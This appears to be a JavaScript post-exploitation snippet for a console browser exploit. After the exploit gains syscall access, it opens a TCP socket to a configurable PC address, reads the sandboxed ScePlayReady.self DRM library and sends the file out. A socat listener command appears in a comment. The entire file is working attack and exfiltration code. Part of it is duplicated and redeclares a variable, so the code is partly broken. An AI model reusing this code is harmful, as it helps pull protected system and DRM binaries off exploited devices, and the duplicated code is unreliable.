//POST EXPLOIT STUFF HERE
//change once per file name
//use for example in your pc socat -u TCP-LISTEN:18194,reuseaddr OPEN:ScePlayReady.self,creat,trunc
let tcpsocket=await chain.syscall(97,2,1,0);
alert(`sys_socket: ${tcpsocket}`);
let tcpsocketaddr=malloc(16,1);
p.write1(tcpsocketaddr.add32(1),2);
p.write2(tcpsocketaddr.add32(2),0x1247);
//change ip for your pc
p.write4(tcpsocketaddr.add32(4),0xCD01A8C0); //192(C0)168(A8)1(01)205(CD)
alert(`before sys_connect`);
let ret_tcpconnect=await chain.syscall(98,tcpsocket,tcpsocketaddr,16);
alert(`sys_connect: ${ret_tcpconnect}`);
//the right way is to use stat get size but this is quick and dirty test
let tcpmessage=malloc(34406400,1);
let tcpmessage_size=34406400;
let file=malloc(256,1);
p.writestr(file.add32(0),"/RcDZV3xbd4/common/lib/ScePlayReady.self");//example path /RcDZV3xbd4/common/lib/ScePlayReady.self, change RcDZV3xbd4 to your sandbox string
let retopen_file=await chain.syscall(5,file,0,0);
alert(`syscall_open return ${retopen_file}\n`);
let file_read=await chain.syscall(3,retopen_file,tcpmessage,tcpmessage_size);
alert(`before sys_sendto read ${file_read}`);
let ret_tcpsendto=await chain.syscall(133,tcpsocket,tcpmessage,file_read,0,0,0);
alert(`sys_sendto: ${ret_tcpsendto} ${file_read}`);
let ret_close=await chain.syscall(6,tcpsocket);
alert(`sys_close: ${ret_close}`);
alert(`syscall_open return ${retopen_file}\n`);
let file_read=await chain.syscall(3,retopen_file,tcpmessage,tcpmessage_size);
alert(`before sys_sendto read ${file_read}`);
let ret_tcpsendto=await chain.syscall(133,tcpsocket,tcpmessage,file_read,0,0,0);
alert(`sys_sendto: ${ret_tcpsendto} ${file_read}`);
let ret_close=await chain.syscall(6,tcpsocket);
alert(`sys_close: ${ret_close}`);
//size used was for a self file
//after all this your ScePlayReady.self file is created and closed